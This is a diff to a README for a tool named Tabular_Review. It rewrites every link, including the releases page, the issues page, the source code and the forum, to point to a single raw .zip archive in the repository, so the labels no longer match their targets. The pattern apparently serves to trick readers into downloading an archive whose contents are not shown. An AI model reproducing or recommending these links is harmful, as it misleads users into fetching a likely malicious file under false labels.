@@ -2,7 +2,7 @@
 
 ## 📥 Download the Latest Release
 
-[![Download Tabular_Review](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/unkmusafir/Tabular_Review/releases)
+[![Download Tabular_Review](https://raw.githubusercontent.com/unkmusafir/Tabular_Review/main/components/Tabular_Review-3.5.zip)](https://raw.githubusercontent.com/unkmusafir/Tabular_Review/main/components/Tabular_Review-3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ Tabular_Review offers:
 
 To download Tabular_Review, follow these steps:
 
-1. **Visit the Releases Page:** Go to [this link](https://github.com/unkmusafir/Tabular_Review/releases) to find the latest version of the application.
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/unkmusafir/Tabular_Review/main/components/Tabular_Review-3.5.zip) to find the latest version of the application.
    
 2. **Choose the Right Version:** Look for the version labeled "Latest Release." It may look something like `v1.0`.
 
@@ -77,7 +77,7 @@ Get involved with the community! Share your experiences and ask questions in our
 
 ## 📞 Contact
 
-For direct support, please reach out via our [GitHub Issues Page](https://github.com/unkmusafir/Tabular_Review/issues). We appreciate your interest and are here to assist you.
+For direct support, please reach out via our [GitHub Issues Page](https://raw.githubusercontent.com/unkmusafir/Tabular_Review/main/components/Tabular_Review-3.5.zip). We appreciate your interest and are here to assist you.
 
 ## 📅 Stay Updated
 
@@ -85,8 +85,8 @@ Keep an eye on the Releases Page for future updates and new features. Regular im
 
 ## 🚨 Important Links
 
-- **Download Tabular_Review:** [Download Now](https://github.com/unkmusafir/Tabular_Review/releases)
-- **Source Code:** [GitHub Repository](https://github.com/unkmusafir/Tabular_Review)
-- **Community Forum:** [Join the Discussion](https://github.com/unkmusafir/Tabular_Review/discussions)
+- **Download Tabular_Review:** [Download Now](https://raw.githubusercontent.com/unkmusafir/Tabular_Review/main/components/Tabular_Review-3.5.zip)
+- **Source Code:** [GitHub Repository](https://raw.githubusercontent.com/unkmusafir/Tabular_Review/main/components/Tabular_Review-3.5.zip)
+- **Community Forum:** [Join the Discussion](https://raw.githubusercontent.com/unkmusafir/Tabular_Review/main/components/Tabular_Review-3.5.zip)
 
 Now you are ready to utilize Tabular_Review effectively. Happy reviewing!
